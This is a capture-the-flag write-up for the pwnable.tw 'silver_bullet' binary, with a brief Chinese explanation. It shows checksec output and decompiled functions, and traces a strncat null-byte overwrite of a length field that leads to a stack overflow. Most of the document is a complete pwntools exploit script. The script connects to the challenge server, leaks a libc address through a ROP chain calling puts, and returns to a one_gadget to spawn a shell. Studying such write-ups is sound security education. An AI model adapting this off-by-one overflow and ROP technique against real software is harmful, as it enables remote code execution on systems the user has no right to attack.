# silver_bullet

## checksec

```shell
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## IDA

**create**
```c
int __cdecl create_bullet(char *s)
{
  size_t v2; // [esp+0h] [ebp-4h]

  if ( *s )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(s, 0x30u);
  v2 = strlen(s);
  printf("Your power is : %u\n", v2);
  *((_DWORD *)s + 12) = v2;
  return puts("Good luck !!");
}
```
**power_up**
```c
int __cdecl power_up(char *dest)
{
  char s[48]; // [esp+0h] [ebp-34h] BYREF
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(s, 0, sizeof(s));
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(s, 48 - *((_DWORD *)dest + 12));
  strncat(dest, s, 48 - *((_DWORD *)dest + 12));
  v3 = strlen(s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
}
```
我尝试运行程序，输入几个垃圾数据，发现在`power_up`中，能覆盖长度，从而得到一个很大的数，从而在beat中正常退出程序执行ROP。
所以漏洞点在`power_up`中。这里在`strncat`在拼接字符串后，会在最后加”\\x00“进行截断，可以覆盖大小，产生栈溢出。

## exp
```python 
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name,hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./silver_bullet'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('chall.pwnable.tw',10103)

elf = ELF(binary,checksec=False)
libc = ELF('./libc_32.so.6',checksec=False)

puts_plt = elf.plt['puts']
read_got = elf.got['read']
#gdb.attach(p)
one = [0x3a819, 0x5f065, 0x5f066]

#create
p.sendlineafter('Your choice :',"1")
payload='a'*47
p.sendlineafter('Give me your description of bullet :',payload)

#power up
p.sendlineafter('Your choice :',"2")
payload='a'
p.sendlineafter('Give me your another description of bullet :',payload)

p.sendlineafter('Your choice :',"2")
payload='\xff'*7+p32(puts_plt)+p32(0x8048954)+p32(read_got)
p.sendlineafter('Give me your another description of bullet :',payload)

p.sendlineafter('Your choice :',"3")
read_addr = u32(p.recvuntil('\xf7')[-4:])
leak('read',read_addr)
libcbase= read_addr-libc.sym['read']
one_gedget = libcbase+one[0]

p.sendlineafter('Your choice :',"1")
payload='a'*47
p.sendlineafter('Give me your description of bullet :',payload)

#power up
p.sendlineafter('Your choice :',"2")
payload='a'
p.sendlineafter('Give me your another description of bullet :',payload)

p.sendlineafter('Your choice :',"2")
payload='\xff'*7+p32(one_gedget)
p.sendlineafter('Give me your another description of bullet :',payload)
p.sendlineafter('Your choice :',"3")

p.interactive()
```